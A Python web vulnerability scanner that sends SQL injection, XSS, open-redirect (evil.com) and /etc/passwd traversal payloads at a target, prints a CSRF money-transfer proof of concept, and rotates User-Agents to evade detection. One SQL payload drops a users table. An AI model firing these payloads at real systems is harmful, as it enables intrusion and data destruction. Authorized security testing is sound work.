import argparse
import requests
import logging
import time
import random

# Configure logging
logging.basicConfig(filename='security_scan.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Rotate User-Agents to prevent detection
HEADERS = [
    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
    {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"},
    {"User-Agent": "Mozilla/5.0 (Linux; Android 10)"},
]

def get_headers():
    """Randomize request headers to avoid detection"""
    return random.choice(HEADERS)

def check_authorization(url):
    """Ensure ethical use by requiring proof of authorization"""
    confirmation = input(f"Do you have permission to test {url}? (yes/no): ").strip().lower()
    if confirmation != "yes":
        print("Authorization denied. Exiting...")
        exit(1)

def check_sql_injection(url, param):
    """Test for SQL Injection using multiple payloads and time-based methods"""
    payloads = [
        "' OR '1'='1", 
        "'; DROP TABLE users --", 
        '" OR "1"="1', 
        "1' OR '1'='1' -- ", 
        "' UNION SELECT null, version() -- ",
        "' OR SLEEP(5) --",  # Time-based SQLi
        "'; WAITFOR DELAY '0:0:5' --",  # SQL Server delay
        "' OR pg_sleep(5) --"  # PostgreSQL delay
    ]
    
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        try:
            start_time = time.time()
            response = requests.get(test_url, headers=get_headers(), timeout=10)
            elapsed_time = time.time() - start_time

            print(f"DEBUG: Testing {test_url}\nResponse Time: {elapsed_time}s\nResponse Content:\n{response.text[:500]}\n")

            if "error" in response.text.lower() or "sql" in response.text.lower():
                return f"SQL Injection Detected! PoC: `{test_url}`"
            if elapsed_time > 4:  # Time delay detected
                return f"Time-Based SQL Injection Detected! PoC: `{test_url}` (Response took {elapsed_time}s)"
        except requests.RequestException as e:
            logging.error(f"Request failed: {e}")
    
    return "No SQL Injection vulnerability detected."

def scan_xss(url, param):
    """Test for XSS vulnerability"""
    payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "'; alert('XSS');//",
        "<svg/onload=alert('XSS')>"
    ]
    
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(test_url, headers=get_headers(), timeout=10)
            if payload in response.text:
                return f"XSS Detected! PoC: `{test_url}`"
        except requests.RequestException as e:
            logging.error(f"Request failed: {e}")

    return "No XSS vulnerability detected."

def check_csrf(url):
    """Check if CSRF protection is missing"""
    try:
        response = requests.get(url, headers=get_headers(), timeout=10)
        if "csrf" in response.text.lower() or "token" in response.text.lower():
            return "CSRF protection detected."
        else:
            return (
                "CSRF Vulnerability Detected!\n"
                "PoC:\n"
                "Create an HTML file with:\n"
                "```html\n"
                "<form action='TARGET_URL' method='POST'>\n"
                "    <input type='hidden' name='amount' value='1000'>\n"
                "    <input type='submit' value='Steal Money'>\n"
                "</form>\n"
                "```\n"
                "Open the file in a browser while logged into the target site.\n"
                "If the form submits successfully, the site is vulnerable."
            )
    except requests.RequestException as e:
        logging.error(f"Request failed: {e}")

    return "Request failed. Check logs."

def analyze_security_headers(url):
    """Check for missing security headers"""
    try:
        response = requests.get(url, headers=get_headers(), timeout=10)
        headers = response.headers
        security_issues = []

        header_checks = {
            "Content-Security-Policy": "Missing Content Security Policy (CSP)!",
            "X-Frame-Options": "Clickjacking Protection Missing!",
            "X-Content-Type-Options": "MIME Sniffing Protection Missing!",
            "Strict-Transport-Security": "HSTS Not Enabled!",
            "Referrer-Policy": "Referrer Policy Missing!"
        }

        for header, warning in header_checks.items():
            if header not in headers:
                security_issues.append(warning)

        return "\n".join(security_issues) if security_issues else "All recommended security headers are present."

    except requests.RequestException as e:
        logging.error(f"Request failed: {e}")

    return "Request failed. Check logs."

def check_open_redirect(url, param):
    """Check if the website is vulnerable to Open Redirects"""
    payload = "https://evil.com"
    test_url = f"{url}?{param}={payload}"
    
    try:
        response = requests.get(test_url, headers=get_headers(), timeout=10, allow_redirects=False)
        if response.status_code in [301, 302] and "location" in response.headers and payload in response.headers["location"]:
            return f"Open Redirect Detected! PoC: `{test_url}`"
    except requests.RequestException as e:
        logging.error(f"Request failed: {e}")

    return "No Open Redirect vulnerability detected."

def check_directory_traversal(url, param):
    """Check for Directory Traversal vulnerabilities"""
    payloads = ["../../etc/passwd", "..\\..\\Windows\\win.ini"]
    
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(test_url, headers=get_headers(), timeout=10)
            if "root:x:" in response.text or "for 16-bit app support" in response.text:
                return f"Directory Traversal Detected! PoC: `{test_url}`"
        except requests.RequestException as e:
            logging.error(f"Request failed: {e}")

    return "No Directory Traversal vulnerability detected."

def main():
    parser = argparse.ArgumentParser(description="Enhanced Ethical Web Security Scanner")
    parser.add_argument("-u", "--url", help="Target URL", required=True)
    parser.add_argument("-p", "--param", help="Parameter to test", required=True)
    parser.add_argument("--sqli", action="store_true", help="Test for SQL Injection")
    parser.add_argument("--xss", action="store_true", help="Test for XSS")
    parser.add_argument("--csrf", action="store_true", help="Check for CSRF protection")
    parser.add_argument("--headers", action="store_true", help="Analyze security headers")
    parser.add_argument("--redirect", action="store_true", help="Check for Open Redirects")
    parser.add_argument("--traversal", action="store_true", help="Check for Directory Traversal")

    args = parser.parse_args()
    check_authorization(args.url)

    if args.sqli: print(check_sql_injection(args.url, args.param))
    if args.xss: print(scan_xss(args.url, args.param))
    if args.csrf: print(check_csrf(args.url))
    if args.headers: print(analyze_security_headers(args.url))
    if args.redirect: print(check_open_redirect(args.url, args.param))
    if args.traversal: print(check_directory_traversal(args.url, args.param))

if __name__ == "__main__":
    main()
